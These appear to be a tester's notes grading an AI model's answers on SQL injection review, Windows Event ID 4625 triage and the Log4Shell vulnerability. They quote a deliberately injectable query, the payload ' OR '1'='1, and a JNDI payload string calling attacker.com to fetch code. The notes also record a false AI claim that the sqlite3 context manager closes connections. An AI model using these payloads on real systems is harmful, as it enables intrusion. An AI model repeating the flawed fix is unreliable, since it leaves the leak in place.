# Results

## Experiment 1: SQL injection code review

**Model:** gemini-3.8-flash

**Prompt:**

```

Review this Python code for security problems and suggest a fix:

import sqlite3

def get_user(username):

    conn = sqlite3.connect("users.db")

    query = "SELECT * FROM users WHERE name = '" + username + "'"

    return conn.execute(query).fetchall()

```

**My expectation (before running):** Gemini will find SQL injection and suggest parameterized queries.

**Gemini's response:**

The code you shared has a critical security vulnerability: **SQL Injection**. 

Because `username` is directly concatenated into the SQL string, an attacker could supply an input like `' OR '1'='1` to bypass checks or execute unauthorized SQL commands. Additionally, the database connection is never closed.

---

### Secure & Improved Version

Use **parameterized queries** (placeholders `?`) so the database engine treats user input strictly as data, never as executable SQL. You should also use a context manager (`with`) to properly manage the connection.

```python
import sqlite3


def get_user(username):
    # Using 'with' automatically handles closing/committing
    with sqlite3.connect("users.db") as conn:
        query = "SELECT * FROM users WHERE name = ?"
        # Pass parameters as a tuple: (username,)
        return conn.execute(query, (username,)).fetchall()
```

---

### Why this is better:
1. **Prevents SQL Injection:** SQLite safely escapes and parameterizes the `username` input.
2. **Resource Management:** The `with sqlite3.connect(...)` block ensures connections and transactions are handled cleanly without leaking open file handles.

**My assessment:**

- **Right:** Correctly found SQL injection (CWE-89). The payload `' OR '1'='1` is a real attack that would return all users. Parameterized queries (`?`) are the correct fix and match the OWASP guidance.

- **Right:** Correctly noticed the database connection is never closed.

- **Wrong:** Gemini said `with sqlite3.connect(...)` makes sure the connection closes. This is false. The Python sqlite3 documentation says the connection's context manager only commits or rolls back the transaction. It does not close the connection. So Gemini's "fixed" code still has the leak it warned about.

- **How I checked:** Read the official Python sqlite3 documentation on using the connection as a context manager.

- **Correct fix:** use `contextlib.closing()` or call `conn.close()`.

## Experiment 2: Windows Event ID 4625
**Model:** gemini-3.8-flash

**Prompt:** What does Windows Event ID 4625 mean, and when should a SOC analyst worry about it?

**Response:**

### What is Windows Event ID 4625?

**Event ID 4625** is generated in the Windows Security log whenever **an account fails to log on**. It is recorded on the system where the logon attempt was made (for local accounts or interactive logons) or on the Domain Controller (for domain accounts via Kerberos/NTLM).

Because users mistype passwords constantly, Event ID 4625 is one of the **noisiest and most common events** in any Windows environment. However, it is also the primary telemetry source for detecting credential-based attacks.

---

### Crucial Fields in Event ID 4625

To determine if an event is malicious, an analyst must look past the Event ID itself and inspect these specific fields:

1. **Logon Type:** How the attempt was made.
   * **Type 2 (Interactive):** Physical console or direct keyboard login.
   * **Type 3 (Network):** Accessing shared folders, SMB, or network services.
   * **Type 4 (Batch):** Scheduled tasks.
   * **Type 5 (Service):** Windows services starting up.
   * **Type 10 (RemoteInteractive):** Remote Desktop Protocol (RDP).
2. **Sub Status Code:** The exact reason the logon failed:
   * `0xC000006A`: Correct username, **wrong password**.
   * `0xC0000064`: The **username does not exist**.
   * `0xC0000234`: The account is **locked out**.
   * `0xC0000072`: The account is **disabled**.
   * `0xC0000193`: The account has **expired**.
3. **TargetUserName:** The username targeted.
4. **IpAddress / Workstation Name:** The origin of the attempt.

---

### When Should a SOC Analyst Worry?

A single Event ID 4625 is almost never an incident. You should worry when you see specific **patterns, volumes, and contexts**:

#### 1. Password Spraying Attacks
* **The Pattern:** A single source IP generates Event ID 4625 across **many distinct usernames**, but only 1–3 times per username, usually with intervals to avoid account lockout thresholds.
* **Why it matters:** Attackers often test common passwords (e.g., `SeasonYear!`, `Company123!`) across the entire organization.
* **Substatus:** Mostly `0xC000006A` (bad password) or `0xC0000064` (user doesn't exist).

#### 2. Brute-Force Attacks
* **The Pattern:** Hundreds or thousands of 4625 events targeted at a **single username** within a short timeframe from a single source IP.
* **Why it matters:** Classic brute-force attack. If you see this, look for subsequent `0xC0000234` (Account Locked Out) or, worse, an **Event ID 4624** (Successful Logon) immediately following the failures, indicating the attacker succeeded.

#### 3. High-Value / Suspicious Accounts Targeted
* **Privileged Accounts:** Failures targeting Domain Admins, `krbtgt`, or built-in `Administrator`.
* **Non-Existent Users (`0xC0000064`):** Failures targeting usernames not in your Active Directory (e.g., `root`, `admin`, `test`, `oracle`), indicating an attacker is guessing using generic wordlists.
* **Honeypot/Decoy Accounts:** Any logon attempt against a known decoy account is an immediate, high-fidelity alert.
* **Disabled/Terminated Accounts (`0xC0000072`):** Attempts to log in using accounts of former employees or dormant service accounts.

#### 4. Lateral Movement (Internal Threat)
* **The Pattern:** Event ID 4625 with **Logon Type 3 (Network)** or **Logon Type 10 (RDP)** occurring between internal workstations (e.g., Workstation A attempting to log into Workstation B, C, and D).
* **Why it matters:** Endpoints rarely connect to other endpoints in typical enterprise environments. This often signals an adversary who compromised one machine and is trying to pivot using harvested credentials.

#### 5. Internet-Exposed Services (External RDP/SMB)
* **The Pattern:** Event ID 4625 with **Logon Type 10** coming from an external/public IP address.
* **Why it matters:** An RDP port is exposed directly to the internet and is actively being scanned/attacked.

---

### Common False Positives (When NOT to Panic)

Before escalating, rule out these common benign causes:
* **Service/Scheduled Task Password Changes:** If a service account password is changed in AD, but not updated in a local Windows Service (Logon Type 5) or Scheduled Task (Logon Type 4), it will repeatedly generate 4625 errors until locked out.
* **Cached Credentials:** A user changed their domain password, but their mobile device, mapped network drive, or secondary laptop is still trying to authenticate with the old cached password.
* **User Typos:** A handful of failures during the start of a standard workday followed by a successful 4624 from the same IP/workstation.

---

### Quick Triage Checklist for Analysts

1. **Check the volume:** Is it an isolated failure, or part of a burst?
2. **Check the failure reason:** Wrong password (`6A`) vs. non-existent user (`64`)?
3. **Check the source:** Internal host, domain controller, or external IP?
4. **Correlate with Success:** Did the failed logon sequence end with an **Event ID 4624 (Logon Type 2, 3, or 10)** from the same source? If yes, treat this as a **high-priority compromise**.
## Experiment 3: Log4Shell (CVE-2021-44228)

**My expectation (before running):** ...

## prompt3.txt (2026-10-08 11:44)
**Model:** gemini-3.8-flash

**Prompt:** What is CVE-2021-44228, which software does it affect, and how serious is it?

**Response:**

**CVE-2021-44228**, widely known as **“Log4Shell,”** is one of the most critical cybersecurity vulnerabilities discovered in recent history. It was publicly disclosed in early December 2021.

Here is a breakdown of what it is, what it affects, and why it is so dangerous.

---

### 1. What is it?
CVE-2021-44228 is an **unauthenticated Remote Code Execution (RCE)** vulnerability. 

It exists due to how the software handles formatted messages using a feature called **JNDI (Java Naming and Directory Interface)** lookups:
* When Log4j logs a string of text, it checks whether that string contains special commands inside a format like `${jndi:...}`.
* If it detects this format, it reaches out to an external server (often using protocols like LDAP or RMI) to retrieve data or code.
* **The Exploit:** An attacker simply needs to pass a malicious payload—such as `${jndi:ldap://attacker.com/malicious_payload}`—into any input field that the application logs (like a username, a search bar, an HTTP user-agent header, or a chat message). 
* When Log4j writes this to the log file, it automatically contacts the attacker's server, downloads malicious Java code, and **executes it with the privileges of the running application.**

---

### 2. Which software does it affect?

#### Direct Software:
* **Apache Log4j 2**: Specifically, versions **2.0-beta9 through 2.14.1**. (Log4j 1.x is not vulnerable to this specific CVE, though it has separate, older vulnerabilities).

#### Indirect/Downstream Impact:
Because Log4j is the de facto logging library for the Java programming language, it was embedded in thousands of enterprise products, consumer apps, and cloud services. 

Affected software and platforms included:
* **Consumer Apps:** The exploit was famously first observed in *Minecraft: Java Edition* (players could take over servers or other clients by typing the exploit string into the in-game chat).
* **Enterprise Infrastructure:** VMware, Cisco, IBM, Oracle, and Red Hat products.
* **Cloud Platforms:** Amazon Web Services (AWS), Apple iCloud, Google Cloud, and Microsoft Azure.
* **Big Data Frameworks:** Apache Solr, Apache Struts, Apache Flink, and ElasticSearch.

Many companies did not even know they were running Log4j because it was buried several layers deep inside third-party dependencies.

---

### 3. How serious is it?

It is rated as **Maximum Severity**.

* **CVSS Score:** **10.0 out of 10.0** (Critical) — the highest possible severity rating.
* **CISA Warning:** The U.S. Cybersecurity and Infrastructure Security Agency (CISA) called it one of the most serious vulnerabilities they had ever seen.

**Why it is uniquely dangerous:**
1. **Trivially Easy to Exploit:** An attacker does not need advanced skills. Exploitation requires sending a single line of text into any interface that eventually gets logged.
2. **No Authentication Required:** Attackers can compromise systems remotely over the internet without having an account or credentials.
3. **Full System Takeover (RCE):** Once the malicious code executes, attackers can steal data, install ransomware, establish backdoors, or recruit servers into botnets.
4. **Ubiquity:** Java runs on billions of devices globally, and Log4j was omnipresent across corporate and government IT environments.
5. **Difficult to Detect/Patch:** Because Log4j is often an indirect dependency bundled deep inside compiled Java archives (`.jar` or `.war` files), organizations struggled for months just to identify which of their systems were actually vulnerable.

---

### How it was resolved:
Apache released multiple patches to fix the issue and subsequent bypasses discovered shortly after. The vulnerability was permanently mitigated by completely disabling JNDI lookups by default, starting in **Log4j version 2.16.0** (with version **2.17.1+** recommended for complete stability and security).
